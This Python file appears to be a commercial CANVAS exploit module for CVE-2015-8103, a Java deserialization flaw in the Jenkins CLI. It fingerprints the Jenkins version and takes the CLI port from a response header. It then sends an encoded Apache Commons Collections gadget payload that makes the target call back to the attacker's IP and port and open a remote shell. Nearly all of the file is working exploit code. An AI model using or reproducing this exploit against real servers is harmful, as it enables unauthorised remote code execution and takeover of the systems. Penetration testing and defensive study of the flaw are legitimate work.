#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import logging
import os
import base64
import struct
import socket
import re

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy
from libs.apache_commons_deserialize import objectcreator

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "jenkins_cli_deserialization"
DESCRIPTION                     = "Jenkins 1.598-1.638 Apache Commons pre-3.2.2 Deserialization Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Jenkins"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2015-8103"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8103"
DOCUMENTATION['References']     = ['http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/',
                                   'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11',
]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
# PROPERTY['ARCH']                = [""]
PROPERTY['VERSION']             = ["All"]

DOCUMENTATION['NOTES'] = """
IMPORTANT NOTE: Any instance of this application running Apache Commons Collections version prior to 3.0 WILL NOT WORK. 


Jenkins has a remote command line interface console. It is often unauthenticated. It communicates
with a client by exchanging serialized Java Objects. Apache Commons pre-3.2.2 allows users to 
serialize transformers on collection values. Of importance to us is the InvokerTransfomer, which 
is capable of invoking Java methods. We are able to run these transformers by adding them to an
annotation map whose members are acccessed. The right chain of method invocations leads to arbitrary
code execution.

NOTE: By default, Jenkins starts its management web application on 0.0.0.0:8080.
For this module to work, both the web interface specified above *and* the CLI port specified by the
X-Jenkins-CLI-Port element in the HTTP response headers from said web interface need to be
accessible by the CANVAS host.

Version support:
> Windows 7 Ultimate SP1 x86
- 1.598 on Java SE 6 / 7 / 8
- 1.637 on Java SE 6 / 7 / 8
> Ubuntu Linux 14.04.3 - x86
- 1.598 on Java SE 6 / 7 / 8
- 1.600 on Java SE 6 / 7 / 8
- 1.637 on Java SE 6 / 7 / 8
"""

CHANGELOG = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8080
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False
        
        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.content_type       = ""


        self.targetpath         = "/"


        # MOSDEF options
        self.autoFind = False

        self.version_re = re.compile("Jenkins ver\. (?P<version>[\d\.]+)\<")
        

        return
    
    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        
        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        return

    def send_jboss_request(self, payload=None):
        if not self.hostname:
            self.hostname = self.host
            
        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)
        
        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None
        
        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        host_field = "%s:%s" % (self.hostname, self.port)
        
        self.ua.addHeader("Host", host_field)
 
        data = None
        if payload != None:
            data = self.ua.POST(self.targetpath, payload, extraheaders=None, noresponse=True)
        else:

            data = self.ua.GET(self.targetpath, noresponse=False)

        return data

    def get_jenkins_info(self):
        if not self.hostname:
            self.hostname = self.host
            
        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)
        
        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        
        host_field = "%s:%s" % (self.hostname, self.port)
        
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        self.ua.addHeader("Host", host_field)
        
        (response, response_code) = self.ua.GET(self.targetpath, noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        version = self.extract_regex_result(response, self.version_re, "version")
        if self.version_test(version):
            return_value = None
            if 299 < response_code or response_code < 200:
                pass
            else:
                for line in response.split("\r\n"):
                    if "X-Jenkins-CLI-Port" in line:
                        field = line.split(":")
                        return_value = int(field[1])
                        break

            return return_value
        else:
            return None
        
    def jenkins_string(self, string):
        return struct.pack(">H", len(string)) + string

    def version_test(self, version):
        choice = False
        if version != None:
            choice = "1.598" <= version and version <= "1.637"
        return choice

    def test(self):
        self.getargs()
        
        if not self.hostname:
            self.hostname = self.host
            
        self.log("Attacking %s:%d" % (self.hostname, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)
        
        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        
        host_field = "%s:%s" % (self.hostname, self.port)
        
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        self.ua.addHeader("Host", host_field)
        
        (response, response_code) = self.ua.GET(self.targetpath, noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        version = self.extract_regex_result(response, self.version_re, "version")
        
        return self.version_test(version)
        

    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)
        
        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]
    
    def welcome_recv(self, sock):
        resp = []
        state = 0
        
        # 4 NULLs for 'channel is binary'
        nulls = 0
        
        while True:
            tmp = sock.recv(1)
            resp.append(tmp)
            
            if state == 0:
                if tmp == ">":
                    state = 1
            if state == 1:
                if tmp == "=":
                    state = 2
            else:
                if tmp == "\x00":
                    nulls += 1
                if nulls >= 4:
                    break
    
        return "".join(resp)

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
        self.log("Using version: %s" % self.version)

        cli_port = self.get_jenkins_info()
        failed = True
        
        if cli_port != None:
            self.log("Grabbed Jenkins CLI protocol V1 port:%d" % cli_port)
            
            self.setProgress(33)

            payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=self.needs_mosdef_http(),
                                    use_ssl=False).get_payload()
            
            sock = socket.socket(socket.AF_INET)
            sock.settimeout(float(3))
            
            sock.connect((self.host, cli_port))

            self.setProgress(25)

            sock.sendall(self.jenkins_string("Protocol:CLI-connect"))

            blob = self.welcome_recv(sock)
            
            self.setProgress(50)

            # The next part is important
            remoting_header = blob[:blob.index('>')+1]

            self.setProgress(75)

            sock.sendall(remoting_header + base64.b64encode(payload))
            self.setInfo("sleeping 5 seconds - waiting for callback...")

            time.sleep(5)
            sock.close()
                
            self.setProgress(100)
            failed = False

        return 1 if not failed else 0


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
